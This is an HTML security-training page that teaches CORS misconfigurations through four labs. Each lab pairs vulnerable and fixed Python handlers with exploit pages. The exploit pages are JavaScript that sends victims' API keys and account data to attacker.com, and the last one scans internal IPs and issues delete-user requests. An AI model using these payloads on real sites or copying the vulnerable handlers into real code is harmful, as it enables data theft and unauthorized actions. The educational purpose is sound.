<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Code Review Playground | Security Learning</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
    <style>
        :root {
            --bg-primary: #0a0e17;
            --bg-secondary: #131a2b;
            --bg-tertiary: #1a2540;
            --accent-red: #ff4757;
            --accent-green: #2ed573;
            --accent-blue: #3742fa;
            --accent-yellow: #ffa502;
            --accent-purple: #8b5cf6;
            --accent-cyan: #00d4ff;
            --accent-orange: #ff6b35;
            --text-primary: #e2e8f0;
            --text-secondary: #94a3b8;
            --border-color: #2a3a5c;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
        }

        .header {
            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
            padding: 20px 40px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            font-size: 1.8rem;
            background: linear-gradient(135deg, var(--accent-orange), var(--accent-yellow));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .header-badge { display: flex; gap: 10px; }

        .badge {
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
        }

        .badge-lab {
            background: rgba(255, 107, 53, 0.2);
            color: var(--accent-orange);
            border: 1px solid var(--accent-orange);
        }

        .badge-count {
            background: rgba(255, 165, 2, 0.2);
            color: var(--accent-yellow);
            border: 1px solid var(--accent-yellow);
        }

        .main-container { display: flex; height: calc(100vh - 80px); }

        .sidebar {
            width: 340px;
            background: var(--bg-secondary);
            border-right: 1px solid var(--border-color);
            overflow-y: auto;
            padding: 20px 0;
        }

        .sidebar-section { margin-bottom: 25px; }

        .sidebar-title {
            padding: 10px 20px;
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-secondary);
            font-weight: 600;
        }

        .lab-item {
            padding: 12px 20px;
            cursor: pointer;
            border-left: 3px solid transparent;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .lab-item:hover {
            background: var(--bg-tertiary);
            border-left-color: var(--accent-orange);
        }

        .lab-item.active {
            background: var(--bg-tertiary);
            border-left-color: var(--accent-yellow);
        }

        .lab-item i { font-size: 1.1rem; width: 24px; text-align: center; }
        .lab-item .lab-name { flex: 1; font-size: 0.85rem; }

        .lab-item .difficulty {
            font-size: 0.65rem;
            padding: 3px 8px;
            border-radius: 10px;
            text-transform: uppercase;
            font-weight: 600;
        }

        .difficulty.apprentice { background: rgba(46, 213, 115, 0.2); color: var(--accent-green); }
        .difficulty.practitioner { background: rgba(255, 165, 2, 0.2); color: var(--accent-yellow); }
        .difficulty.expert { background: rgba(255, 71, 87, 0.2); color: var(--accent-red); }

        .content-area { flex: 1; overflow-y: auto; padding: 30px 40px; }

        .lab-header { margin-bottom: 30px; }
        .lab-header h2 { font-size: 1.6rem; margin-bottom: 10px; color: var(--text-primary); }

        .lab-meta { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 15px; }

        .meta-item {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        .meta-item i { color: var(--accent-orange); }

        .lab-description { color: var(--text-secondary); line-height: 1.7; font-size: 0.95rem; }

        .vuln-section {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border-color);
        }

        .vuln-section h3 {
            font-size: 1.1rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .vuln-section h3 i { color: var(--accent-red); }

        .vuln-list { list-style: none; padding-left: 0; }

        .vuln-list li {
            padding: 8px 0;
            padding-left: 25px;
            position: relative;
            color: var(--text-secondary);
            line-height: 1.6;
        }

        .vuln-list li::before {
            content: '>';
            position: absolute;
            left: 0;
            color: var(--accent-orange);
        }

        .code-review-section { margin-bottom: 30px; }

        .code-tabs { display: flex; gap: 10px; margin-bottom: 15px; }

        .code-tab {
            padding: 10px 20px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.85rem;
            color: var(--text-secondary);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .code-tab:hover { border-color: var(--accent-orange); }

        .code-tab.active {
            background: var(--accent-red);
            border-color: var(--accent-red);
            color: white;
        }

        .code-tab.secure.active {
            background: var(--accent-green);
            border-color: var(--accent-green);
        }

        .code-container {
            position: relative;
            background: #1e1e1e;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
            margin-bottom: 15px;
        }

        .code-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 20px;
            background: var(--bg-tertiary);
            border-bottom: 1px solid var(--border-color);
        }

        .code-filename {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        .code-filename i { color: var(--accent-yellow); }

        .code-block {
            padding: 20px;
            overflow-x: auto;
            max-height: 500px;
            overflow-y: auto;
        }

        .code-block pre {
            margin: 0;
            font-family: 'Fira Code', 'Consolas', monospace;
            font-size: 0.9rem;
            line-height: 1.6;
        }

        .vuln-line {
            background: rgba(255, 71, 87, 0.15);
            display: block;
            margin: 0 -20px;
            padding: 0 20px;
            border-left: 3px solid var(--accent-red);
        }

        .secure-line {
            background: rgba(46, 213, 115, 0.15);
            display: block;
            margin: 0 -20px;
            padding: 0 20px;
            border-left: 3px solid var(--accent-green);
        }

        .payload-section {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border-color);
        }

        .payload-section h3 {
            font-size: 1.1rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--accent-green);
        }

        .payload-box {
            background: #1e1e1e;
            border-radius: 8px;
            padding: 15px 20px;
            margin-bottom: 15px;
            border: 1px solid var(--border-color);
            font-family: 'Fira Code', monospace;
            font-size: 0.85rem;
            color: var(--accent-yellow);
            overflow-x: auto;
            position: relative;
            white-space: pre;
        }

        .payload-box .payload-label {
            position: absolute;
            top: -10px;
            left: 15px;
            background: var(--bg-secondary);
            padding: 2px 10px;
            font-size: 0.7rem;
            color: var(--text-secondary);
            border-radius: 4px;
            font-family: 'Segoe UI', sans-serif;
        }

        .hidden { display: none !important; }

        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg-primary); }
        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--accent-orange); }

        .back-link {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 0.9rem;
            transition: color 0.3s;
        }

        .back-link:hover { color: var(--accent-orange); }

        .info-box {
            background: rgba(0, 212, 255, 0.1);
            border: 1px solid var(--accent-cyan);
            border-radius: 8px;
            padding: 15px 20px;
            margin-bottom: 20px;
            font-size: 0.9rem;
            color: var(--accent-cyan);
        }

        .info-box i { margin-right: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <a href="../tools.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Tools</a>
            <h1><i class="fas fa-globe"></i> CORS Code Review Playground</h1>
        </div>
        <div class="header-badge">
            <span class="badge badge-lab">PortSwigger Labs</span>
            <span class="badge badge-count">4 Labs</span>
        </div>
    </div>

    <div class="main-container">
        <div class="sidebar">
            <div class="sidebar-section">
                <div class="sidebar-title"><i class="fas fa-globe-americas"></i> Origin Validation Flaws</div>
                <div class="lab-item active" data-lab="lab1-origin-reflection">
                    <i class="fas fa-reflect" style="color: var(--accent-red);"></i>
                    <span class="lab-name">Basic Origin Reflection</span>
                    <span class="difficulty apprentice">Easy</span>
                </div>
                <div class="lab-item" data-lab="lab2-null-origin">
                    <i class="fas fa-ban" style="color: var(--accent-yellow);"></i>
                    <span class="lab-name">Trusted Null Origin</span>
                    <span class="difficulty practitioner">Med</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title"><i class="fas fa-shield-alt"></i> Protocol & Network Issues</div>
                <div class="lab-item" data-lab="lab3-insecure-protocol">
                    <i class="fas fa-unlock" style="color: var(--accent-orange);"></i>
                    <span class="lab-name">Trusted Insecure Protocols</span>
                    <span class="difficulty practitioner">Med</span>
                </div>
                <div class="lab-item" data-lab="lab4-internal-network">
                    <i class="fas fa-network-wired" style="color: var(--accent-purple);"></i>
                    <span class="lab-name">Internal Network Pivot</span>
                    <span class="difficulty expert">Hard</span>
                </div>
            </div>
        </div>

        <div class="content-area">
            <!-- Lab 1: Basic Origin Reflection -->
            <div id="lab1-origin-reflection" class="lab-content">
                <div class="lab-header">
                    <h2><i class="fas fa-globe"></i> Lab 1: CORS with Basic Origin Reflection</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Apprentice</span></div>
                    </div>
                    <p class="lab-description">
                        The server blindly reflects the Origin header in Access-Control-Allow-Origin without validation.
                        This allows any website to read sensitive data from authenticated API responses.
                    </p>
                </div>

                <div class="info-box">
                    <i class="fas fa-info-circle"></i>
                    <strong>CORS Basics:</strong> Cross-Origin Resource Sharing allows servers to specify which origins can access resources.
                    When misconfigured, it can lead to sensitive data theft from authenticated users.
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>Server reflects any Origin header in ACAO response header</li>
                        <li>Access-Control-Allow-Credentials: true allows cookies</li>
                        <li>Attacker's site can read authenticated API responses</li>
                        <li>Sensitive data (API keys, PII) can be stolen</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab1"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab1"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab1-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>api.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/api/account-details')
@login_required
def account_details():
    user = get_current_user()
    response = jsonify({
        'username': user.username,
        'email': user.email,
        'apiKey': user.api_key  # Sensitive data!
    })

<span class="vuln-line">    # ❌ Blindly reflect Origin header</span>
<span class="vuln-line">    origin = request.headers.get('Origin')</span>
<span class="vuln-line">    response.headers['Access-Control-Allow-Origin'] = origin</span>
<span class="vuln-line">    response.headers['Access-Control-Allow-Credentials'] = 'true'</span>

    return response

# Any website can now read this API response!
# Request from attacker.com:
#   Origin: https://attacker.com
# Response:
#   Access-Control-Allow-Origin: https://attacker.com
#   Access-Control-Allow-Credentials: true
#   {"username": "victim", "apiKey": "secret123"}</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab1-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>api.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python"><span class="secure-line"># ✅ Define allowed origins whitelist</span>
<span class="secure-line">ALLOWED_ORIGINS = [</span>
<span class="secure-line">    'https://www.example.com',</span>
<span class="secure-line">    'https://app.example.com'</span>
<span class="secure-line">]</span>

@app.route('/api/account-details')
@login_required
def account_details():
    user = get_current_user()
    response = jsonify({
        'username': user.username,
        'email': user.email,
        'apiKey': user.api_key
    })

    origin = request.headers.get('Origin')

<span class="secure-line">    # ✅ Only allow whitelisted origins</span>
<span class="secure-line">    if origin in ALLOWED_ORIGINS:</span>
<span class="secure-line">        response.headers['Access-Control-Allow-Origin'] = origin</span>
<span class="secure-line">        response.headers['Access-Control-Allow-Credentials'] = 'true'</span>
<span class="secure-line">    # ✅ If origin not in whitelist, no CORS headers added</span>

    return response

<span class="secure-line"># ✅ Key points:</span>
<span class="secure-line"># - Never reflect arbitrary Origin values</span>
<span class="secure-line"># - Use strict whitelist of trusted origins</span>
<span class="secure-line"># - Consider if credentials are really needed</span></code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">Attacker's page to steal API key (exploit.html)</span>
&lt;html&gt;
&lt;body&gt;
    &lt;script&gt;
        // Make credentialed request to vulnerable API
        fetch('https://vulnerable-website.com/api/account-details', {
            credentials: 'include'  // Send victim's cookies
        })
        .then(response =&gt; response.json())
        .then(data =&gt; {
            // Exfiltrate stolen data to attacker server
            fetch('https://attacker.com/log?data=' +
                encodeURIComponent(JSON.stringify(data)));
        });
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;!-- When victim visits attacker.com while logged in:
     1. Browser sends request to vulnerable API with cookies
     2. Server reflects Origin: attacker.com
     3. Browser allows attacker.com to read response
     4. API key and user data stolen! --&gt;
                    </div>
                </div>
            </div>

            <!-- Placeholder for other labs -->
            <!-- Lab 2: Trusted Null Origin -->
            <div id="lab2-null-origin" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-ban"></i> Lab 2: CORS with Trusted Null Origin</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
                    </div>
                    <p class="lab-description">
                        The server trusts the "null" origin, which can be triggered from sandboxed iframes, data: URLs,
                        or file:// origins. Attackers can craft requests with null origin to bypass CORS restrictions.
                    </p>
                </div>

                <div class="info-box">
                    <i class="fas fa-info-circle"></i>
                    <strong>Null Origin:</strong> Browsers send "Origin: null" for sandboxed iframes, data: URLs, and file:// pages.
                    Trusting null is almost as dangerous as reflecting any origin.
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>Server explicitly trusts "null" as a valid origin</li>
                        <li>Sandboxed iframes send "Origin: null" header</li>
                        <li>Attacker uses iframe sandbox to send null origin</li>
                        <li>data: URLs and file:// also trigger null origin</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab2"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab2"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab2-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>api.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/api/account-details')
@login_required
def account_details():
    user = get_current_user()
    response = jsonify({
        'username': user.username,
        'email': user.email,
        'apiKey': user.api_key
    })

    origin = request.headers.get('Origin')

<span class="vuln-line">    # ❌ Trusts "null" origin!</span>
<span class="vuln-line">    allowed = ['https://trusted.com', 'null']</span>
<span class="vuln-line">    if origin in allowed:</span>
<span class="vuln-line">        response.headers['Access-Control-Allow-Origin'] = origin</span>
<span class="vuln-line">        response.headers['Access-Control-Allow-Credentials'] = 'true'</span>

    return response

# Why is null trusted? Common misconceptions:
# - "Local development needs it" (use localhost instead)
# - "It's just for testing" (it's in production!)
# - "null means no origin" (it's a special attackable value)</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab2-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>api.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/api/account-details')
@login_required
def account_details():
    user = get_current_user()
    response = jsonify({
        'username': user.username,
        'email': user.email,
        'apiKey': user.api_key
    })

    origin = request.headers.get('Origin')

<span class="secure-line">    # ✅ NEVER trust null origin</span>
<span class="secure-line">    allowed = [</span>
<span class="secure-line">        'https://trusted.com',</span>
<span class="secure-line">        'https://app.trusted.com'</span>
<span class="secure-line">    ]</span>

<span class="secure-line">    # ✅ Explicitly reject null</span>
<span class="secure-line">    if origin and origin != 'null' and origin in allowed:</span>
<span class="secure-line">        response.headers['Access-Control-Allow-Origin'] = origin</span>
<span class="secure-line">        response.headers['Access-Control-Allow-Credentials'] = 'true'</span>

    return response

<span class="secure-line"># ✅ For local development, use:</span>
<span class="secure-line"># - http://localhost:3000</span>
<span class="secure-line"># - http://127.0.0.1:8080</span>
<span class="secure-line"># Never use null for dev - it's exploitable!</span></code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">Sandboxed iframe to send null origin (exploit.html)</span>
&lt;html&gt;
&lt;body&gt;
    &lt;!-- Sandboxed iframe sends Origin: null --&gt;
    &lt;iframe sandbox="allow-scripts allow-top-navigation-by-user-activation"
        srcdoc="
            &lt;script&gt;
                fetch('https://vulnerable-website.com/api/account-details', {
                    credentials: 'include'
                })
                .then(r =&gt; r.json())
                .then(data =&gt; {
                    // Send stolen data to attacker
                    location = 'https://attacker.com/log?data=' +
                        encodeURIComponent(JSON.stringify(data));
                });
            &lt;/script&gt;
        "&gt;
    &lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;!-- Alternative: Use data: URL
     Works in some browsers:

     &lt;iframe src="data:text/html,&lt;script&gt;
         fetch('https://vulnerable.com/api', {credentials:'include'})
         .then(r=&gt;r.text()).then(d=&gt;location='https://attacker.com/?'+d)
     &lt;/script&gt;"&gt;&lt;/iframe&gt;
--&gt;
                    </div>
                </div>
            </div>
            <!-- Lab 3: Trusted Insecure Protocols -->
            <div id="lab3-insecure-protocol" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-unlock"></i> Lab 3: CORS with Trusted Insecure Protocols</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
                    </div>
                    <p class="lab-description">
                        The server trusts origins using insecure protocols (HTTP) or has a subdomain with XSS. An attacker
                        can use MITM or XSS on trusted subdomain to steal data via the misconfigured CORS policy.
                    </p>
                </div>

                <div class="info-box">
                    <i class="fas fa-info-circle"></i>
                    <strong>Protocol Trust:</strong> Even if you whitelist specific domains, trusting HTTP versions allows
                    MITM attacks. XSS on any trusted subdomain breaks the entire CORS protection.
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>HTTP origins trusted alongside HTTPS (MITM exploitable)</li>
                        <li>Subdomain wildcard or regex matching is too loose</li>
                        <li>Trusted subdomain has XSS vulnerability</li>
                        <li>Attacker chains XSS with CORS to steal data</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab3"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab3"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab3-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>cors_config.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">def check_origin(origin):
<span class="vuln-line">    # ❌ Trusts HTTP protocol (MITM exploitable)</span>
<span class="vuln-line">    if origin.endswith('.vulnerable-website.com'):</span>
<span class="vuln-line">        return True</span>

<span class="vuln-line">    # ❌ Even worse: trusts all subdomains</span>
<span class="vuln-line">    # Including ones that might have XSS!</span>
    return False

@app.route('/api/account-details')
@login_required
def account_details():
    origin = request.headers.get('Origin')

    if check_origin(origin):
<span class="vuln-line">        # ❌ Allows http://stock.vulnerable-website.com</span>
<span class="vuln-line">        # If that subdomain has XSS, game over!</span>
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'

    return response

# Attack scenario:
# 1. stock.vulnerable-website.com has XSS
# 2. Attacker injects script via XSS
# 3. Script makes CORS request to main API
# 4. Origin is trusted, data stolen!</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab3-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>cors_config.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python"><span class="secure-line"># ✅ Explicit whitelist of HTTPS-only origins</span>
<span class="secure-line">ALLOWED_ORIGINS = {</span>
<span class="secure-line">    'https://www.vulnerable-website.com',</span>
<span class="secure-line">    'https://app.vulnerable-website.com',</span>
<span class="secure-line">    # Only add subdomains that are fully secured</span>
<span class="secure-line">}</span>

def check_origin(origin):
<span class="secure-line">    # ✅ Exact match only - no patterns</span>
<span class="secure-line">    return origin in ALLOWED_ORIGINS</span>

@app.route('/api/account-details')
@login_required
def account_details():
    origin = request.headers.get('Origin')

<span class="secure-line">    # ✅ Strict origin check</span>
<span class="secure-line">    if origin and check_origin(origin):</span>
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'

    return response

<span class="secure-line"># ✅ Key protections:</span>
<span class="secure-line"># - Only HTTPS origins in whitelist</span>
<span class="secure-line"># - Exact match, no wildcards/regex</span>
<span class="secure-line"># - Only include fully-secured subdomains</span>
<span class="secure-line"># - Regular security audits on all trusted origins</span></code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">XSS on trusted subdomain to steal data</span>
&lt;!-- Attacker finds XSS on stock.vulnerable-website.com --&gt;
&lt;!-- Payload injected via XSS: --&gt;

&lt;script&gt;
    // This runs on stock.vulnerable-website.com
    // Origin is trusted by the main API!
    fetch('https://vulnerable-website.com/api/account-details', {
        credentials: 'include'
    })
    .then(response =&gt; response.json())
    .then(data =&gt; {
        // Exfiltrate to attacker's server
        new Image().src = 'https://attacker.com/steal?data=' +
            encodeURIComponent(JSON.stringify(data));
    });
&lt;/script&gt;

&lt;!-- Deliver via XSS URL:
     https://stock.vulnerable-website.com/?search=&lt;script&gt;...&lt;/script&gt;

     Or for HTTP MITM attack:
     1. Victim on same network as attacker
     2. MITM intercepts http://subdomain.vulnerable.com
     3. Inject malicious JavaScript
     4. JS makes CORS request to HTTPS API
     5. Data stolen via HTTP MITM --&gt;
                    </div>
                </div>
            </div>
            <!-- Lab 4: Internal Network Pivot -->
            <div id="lab4-internal-network" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-network-wired"></i> Lab 4: CORS Vulnerability with Internal Network Pivot</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Expert</span></div>
                    </div>
                    <p class="lab-description">
                        The external website trusts internal network origins (like 192.168.x.x or localhost). An attacker on
                        the internal network can pivot through the victim's browser to access internal APIs via CORS.
                    </p>
                </div>

                <div class="info-box">
                    <i class="fas fa-exclamation-triangle" style="color: var(--accent-red);"></i>
                    <strong>Advanced Attack:</strong> This is a multi-stage attack combining XSS, DNS rebinding, or internal
                    network access with CORS misconfiguration to pivot into internal systems.
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>Internal API trusts requests from internal network IPs</li>
                        <li>CORS configured to allow localhost or private IPs</li>
                        <li>Attacker uses victim's browser as proxy to internal network</li>
                        <li>XSS or malicious page forces browser to scan internal hosts</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab4"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab4"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab4-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>internal_api.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python"># Internal admin API (192.168.0.10)
@app.route('/admin/delete-user', methods=['POST'])
def delete_user():
    origin = request.headers.get('Origin')

<span class="vuln-line">    # ❌ Trusts any internal IP or localhost</span>
<span class="vuln-line">    if is_internal_origin(origin):</span>
<span class="vuln-line">        response.headers['Access-Control-Allow-Origin'] = origin</span>
<span class="vuln-line">        response.headers['Access-Control-Allow-Credentials'] = 'true'</span>

    user_id = request.json.get('userId')
    delete_user_by_id(user_id)
    return jsonify({'status': 'deleted'})

<span class="vuln-line">def is_internal_origin(origin):</span>
<span class="vuln-line">    # ❌ Dangerously broad internal network check</span>
<span class="vuln-line">    internal_patterns = [</span>
<span class="vuln-line">        'localhost',</span>
<span class="vuln-line">        '127.0.0.1',</span>
<span class="vuln-line">        '192.168.',</span>
<span class="vuln-line">        '10.',</span>
<span class="vuln-line">        '172.16.'</span>
<span class="vuln-line">    ]</span>
<span class="vuln-line">    return any(p in origin for p in internal_patterns)</span>

# Attack: Victim's browser on internal network becomes pivot point</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab4-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>internal_api.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python"><span class="secure-line"># ✅ Defense in depth for internal APIs</span>

@app.route('/admin/delete-user', methods=['POST'])
<span class="secure-line">@require_admin_auth  # ✅ Always require authentication</span>
<span class="secure-line">@csrf_protect        # ✅ Require CSRF token</span>
def delete_user():
<span class="secure-line">    # ✅ Option 1: No CORS at all for internal APIs</span>
<span class="secure-line">    # Simply don't set any ACAO headers</span>

<span class="secure-line">    # ✅ Option 2: If CORS needed, strict whitelist</span>
<span class="secure-line">    origin = request.headers.get('Origin')</span>
<span class="secure-line">    allowed = ['https://admin.internal.company.com']</span>
<span class="secure-line">    if origin in allowed:</span>
<span class="secure-line">        response.headers['Access-Control-Allow-Origin'] = origin</span>

    user_id = request.json.get('userId')
    delete_user_by_id(user_id)
    return jsonify({'status': 'deleted'})

<span class="secure-line"># ✅ Additional protections:</span>
<span class="secure-line"># - Network segmentation (internal API not reachable from user networks)</span>
<span class="secure-line"># - Require client certificates for internal access</span>
<span class="secure-line"># - IP allowlisting at firewall level</span>
<span class="secure-line"># - Don't rely on Origin header for authorization</span>
<span class="secure-line"># - Always authenticate requests regardless of origin</span></code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">Multi-stage internal network pivot attack</span>
&lt;!-- Stage 1: Attacker hosts this on attacker.com --&gt;
&lt;!-- Victim inside corporate network visits attacker.com --&gt;

&lt;script&gt;
// Stage 2: Scan for internal hosts
const internalHosts = [
    'http://192.168.0.1',
    'http://192.168.0.10',
    'http://192.168.1.1',
    'http://localhost:8080',
    'http://admin.internal'
];

// Stage 3: For each host, try to exploit CORS
internalHosts.forEach(host =&gt; {
    fetch(host + '/admin/delete-user', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({userId: 'carlos'})
    })
    .then(r =&gt; r.json())
    .then(data =&gt; {
        // Report successful attack back to attacker
        fetch('https://attacker.com/log', {
            method: 'POST',
            body: JSON.stringify({host: host, response: data})
        });
    })
    .catch(() =&gt; {}); // Silently fail for unreachable hosts
});
&lt;/script&gt;

&lt;!-- Attack flow:
     1. Victim (inside corp network) visits attacker.com
     2. Attacker's JS runs in victim's browser
     3. Browser makes requests to internal IPs
     4. Internal API sees request from "internal" origin
     5. CORS allows the request, action executed
     6. Attacker pivots through victim's browser! --&gt;
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
    <script>
        // Handle code tab clicks
        document.querySelectorAll('.code-tab').forEach(tab => {
            tab.addEventListener('click', function(e) {
                e.preventDefault();
                const section = this.closest('.code-review-section');
                const view = this.dataset.view;
                const labId = this.dataset.lab;

                section.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
                this.classList.add('active');

                const vulnEl = document.getElementById(`${labId}-vulnerable`);
                const secureEl = document.getElementById(`${labId}-secure`);

                if (vulnEl && secureEl) {
                    if (view === 'vulnerable') {
                        vulnEl.classList.remove('hidden');
                        secureEl.classList.add('hidden');
                    } else {
                        vulnEl.classList.add('hidden');
                        secureEl.classList.remove('hidden');
                    }
                }
            });
        });

        // Lab sidebar navigation
        document.querySelectorAll('.lab-item').forEach(item => {
            item.addEventListener('click', () => {
                document.querySelectorAll('.lab-item').forEach(i => i.classList.remove('active'));
                item.classList.add('active');

                const labId = item.dataset.lab;
                document.querySelectorAll('.lab-content').forEach(content => {
                    content.classList.add('hidden');
                });

                const labContent = document.getElementById(labId);
